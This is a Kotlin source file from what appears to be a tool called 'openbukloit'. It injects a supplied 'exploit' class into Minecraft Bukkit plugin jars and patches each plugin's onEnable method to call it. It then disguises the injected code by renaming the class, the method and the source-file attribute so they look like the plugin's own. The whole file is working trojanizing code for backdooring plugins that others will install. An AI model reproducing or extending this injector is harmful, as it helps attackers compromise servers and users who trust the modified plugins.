package injector

import cli.Logs
import com.github.ajalt.mordant.rendering.TextColors.brightCyan
import com.rikonardo.cafebabe.ClassFile
import com.rikonardo.cafebabe.data.constantpool.*
import com.rikonardo.cafebabe.data.numbers.BinaryInt
import javassist.ClassPool
import org.yaml.snakeyaml.Yaml
import utils.*
import java.io.File
import java.lang.management.ManagementFactory
import java.nio.file.*
import kotlin.io.path.createDirectory
import kotlin.io.path.exists
import kotlin.io.path.inputStream
import kotlin.io.path.writeBytes

fun process(
    input: File,
    output: File,
    exploit: ClassFile,
    replace: Boolean,
    noCamouflage: Boolean,
    className: String?,
    methodName: String?
) {
    Logs.task("Processing ${input.name}")
    if (!replace && output.exists()) {
        Logs.finish().warn("Skipped plugin because output file already exists")
        return
    }
    val tempJar = File("./.openbukloit/temp/current.jar")
    if (tempJar.exists()) tempJar.delete()
    input.copyTo(tempJar)

    val camouflage = if (noCamouflage)
        Camouflage(className?.replace(".", "/") ?: exploit.name, methodName ?: "inject")
    else
        calculateCamouflage(tempJar)

    var fileSystem = FileSystems.newFileSystem(tempJar.toPath(), null)

    val pluginData: Map<String, Any> = Yaml().load(fileSystem.getPath("/plugin.yml").inputStream())
    val pluginName = if (pluginData.containsKey("name")) pluginData["name"] as String
    else throw Exception("No name found in plugin.yml")
    val pluginMainClass = if (pluginData.containsKey("main")) pluginData["main"] as String
    else throw Exception("No main class found in plugin.yml")
    val pluginMainClassFile = pluginMainClass.replace(".", "/") + ".class"

    Logs.info("Plugin name: ${brightCyan(pluginName)}")
    Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")

    val mainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
    Logs.info(
        "Main class version: ${
            brightCyan(mainClass.version.toString())
        } (Java ${
            brightCyan(getJavaVersion(mainClass.version.major, mainClass.version.minor))
        })"
    )

    Logs.info("Injecting exploit template...")
    val originalExploitName = exploit.name
    val tempExploitName = makeRandomLowerCaseString(20)
    val tempExploitMethodName = makeRandomLowerCaseString(20)
    exploit.name = tempExploitName
    val exploitMethod = exploit.findInjectMethod()
    exploitMethod.name = tempExploitMethodName

    fileSystem.getPath("$tempExploitName.class").writeBytes(exploit.compile())
    fileSystem = fileSystem.commit(tempJar.toPath())

    Logs.info("Patching main class...")
    File("./.openbukloit/temp/patched").mkdirs()
    runInjectOnJRE(
        toJRE(requireJDK(mainClass.version.major, mainClass.version.minor)),
        pluginMainClass,
        "onEnable",
        "{ $tempExploitName.$tempExploitMethodName(this); }",
        "./.openbukloit/temp/patched",
    )

    Logs.info("Injecting patched main class...")
    Files.copy(
        Paths.get("./.openbukloit/temp/patched/$pluginMainClassFile"),
        fileSystem.getPath("/$pluginMainClassFile"),
        StandardCopyOption.REPLACE_EXISTING
    )
    File("./.openbukloit/temp/patched").deleteRecursively()

    if (noCamouflage) Logs.info("Renaming exploit class...")
    else Logs.info("Applying camouflage...")
    val patchedMainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
    for (entry in patchedMainClass.constantPool.entries) {
        if (entry is ConstantClass) {
            val nameConst = patchedMainClass.constantPool[entry.nameIndex] as ConstantUtf8
            if (nameConst.value == exploit.name) nameConst.value = camouflage.className
        }
        if (entry is ConstantMethodref) {
            val nameTypeConst = patchedMainClass.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
            val nameConst = patchedMainClass.constantPool[nameTypeConst.nameIndex] as ConstantUtf8
            if (nameConst.value == exploitMethod.name) nameConst.value = camouflage.methodName
        }
    }
    fileSystem.getPath("/$pluginMainClassFile").writeBytes(patchedMainClass.compile(), StandardOpenOption.TRUNCATE_EXISTING)
    exploit.name = camouflage.className
    exploitMethod.name = camouflage.methodName
    for (entry in exploit.constantPool.entries) {
        if (entry is ConstantInvokeDynamic) {
            val nameTypeConst = exploit.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
            val descriptorConst = exploit.constantPool[nameTypeConst.descriptorIndex] as ConstantUtf8
            val descriptorElements = descriptorConst.value.split(")")
            val argElements = descriptorElements[0].split("(")[1].split(";")
            descriptorConst.value = "(${
                argElements.joinToString(";") {
                    if (it == "L$originalExploitName") "L${camouflage.className}" else it
                }
            })" + descriptorElements[1]
        }
    }
    for (attr in exploit.attributes) {
        if (attr.name == "SourceFile") {
            val index = BinaryInt.from(attr.info).value
            val sourceFileConst = exploit.constantPool[index] as ConstantUtf8
            sourceFileConst.value = camouflage.className.substringAfterLast("/") + ".java"
        }
    }
    Files.delete(fileSystem.getPath("$tempExploitName.class"))

    if (camouflage.className.contains("/")) {
        val dir = fileSystem.getPath("${camouflage.className}.class").parent
        if (!dir.exists()) dir.createDirectory()
    }
    fileSystem.getPath("${camouflage.className}.class").writeBytes(exploit.compile())

    fileSystem.close()
    tempJar.copyTo(output, true)
    tempJar.delete()
    Logs.finish().info("${input.name} patched successfully")
}

fun runInjectOnJRE(jvm: Path, clazz: String, method: String, insert: String, saveTo: String) {
    val process = ProcessBuilder(
        jvm.toFile().canonicalPath,
        "-cp",
        getClassPathArg(ManagementFactory.getRuntimeMXBean().classPath),
        "InjectMainKt",
        clazz,
        method,
        insert,
        saveTo
    ).start()
    process.errorStream.bufferedReader().use { bufferedReader ->
        bufferedReader.lines().forEach {
            Logs.error(it)
        }
    }

    process.waitFor()
    val result = process.exitValue()
    if (result != 0) {
        throw Exception("Injection task failed with code: $result")
    }
}

fun injectFunc(clazz: String, method: String, insert: String, saveTo: String) {
    val pool = ClassPool(ClassPool.getDefault())
    pool.appendClassPath("./.openbukloit/temp/current.jar")
    val cc = pool.get(clazz)
    val m = cc.getDeclaredMethod(method)
    m.insertAfter(insert)
    cc.writeFile(saveTo)
}

fun FileSystem.commit(path: Path): FileSystem {
    this.close()
    return FileSystems.newFileSystem(path, null)
}
